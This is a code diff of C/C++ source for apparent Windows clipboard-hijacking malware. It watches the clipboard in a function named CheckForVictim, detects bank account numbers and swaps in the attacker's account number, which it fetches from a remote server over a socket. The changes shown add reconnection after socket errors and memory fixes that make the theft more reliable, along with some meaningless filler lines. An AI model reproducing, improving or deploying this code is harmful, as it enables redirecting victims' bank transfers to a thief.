@@ -31,7 +31,7 @@ LPSTR bankAccount;
 HWND hwndThis;
 HWND hwndNextViewer;
 time_t start, current;
-bool bAset;
+bool bAset, connected;
 char sockbuf[DEAFULT_BUFLEN];
 
 SOCKET ConnectSocket;
@@ -44,8 +44,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	int iSizeofSaClient = sizeof(saClient);
 
 	MSG msg;
-
-	bool connected = false;
 
 	while (GetMessage(&msg, NULL, 0, 0) > 0)
 	{
@@ -161,6 +159,8 @@ bool init_winsock()
 		return false;
 	}
 
+	connected = false;
+
 	return true;
 }
 
@@ -212,12 +212,16 @@ void CheckForVictim()
 			LPSTR lpProgMem = LPSTR(GlobalLock(hProgMem));
 			lstrcpy(lpProgMem, lpCbMem);
 			GlobalUnlock(hCbMem);
-			// hProgMem - adres tymczasowej zmiennej w schowku
+			// lpProgMem - adres tymczasowej zmiennej
 			if (CheckIfAccountNumber(lpProgMem))
 				MoveToCb();
-			GlobalUnlock(hProgMem);
+			GlobalFree(hProgMem);
 		}
+		else
+			int i = 1;
 	}
+	else
+		int i = 1;
 
 	CloseClipboard();
 }
@@ -229,7 +233,7 @@ void MoveToCb()
 	
 	HGLOBAL hGlMem = GlobalAlloc(GHND, (DWORD)MAXL + 1);
 	HGLOBAL lpGlMem = GlobalLock(hGlMem);
-
+	
 	// skopiowanie naszego numeru konta do pam. globalnej
 	memcpy(lpGlMem, bankAccount, MAXL + 1);
 	GlobalUnlock(hGlMem);
@@ -258,6 +262,7 @@ bool CheckIfAccountNumber(LPSTR str)
 void GetAccountNumber()
 {
 	int sockbuflen = DEAFULT_BUFLEN;
+	ZeroMemory(sockbuf, sockbuflen);
 	int iResult;
 	strcpy_s(sockbuf, "Dawaj numer konta!");
 
@@ -265,6 +270,7 @@ void GetAccountNumber()
 	iResult = send(ConnectSocket, sockbuf, (int)strlen(sockbuf), 0);
 	if (iResult == SOCKET_ERROR) {
 		closesocket(ConnectSocket);
+		init_winsock();
 		return;
 	}
 
@@ -273,6 +279,7 @@ void GetAccountNumber()
 	if (iResult == SOCKET_ERROR)
 	{
 		closesocket(ConnectSocket);
+		init_winsock();
 		return;
 	}
 	if (iResult > 0)
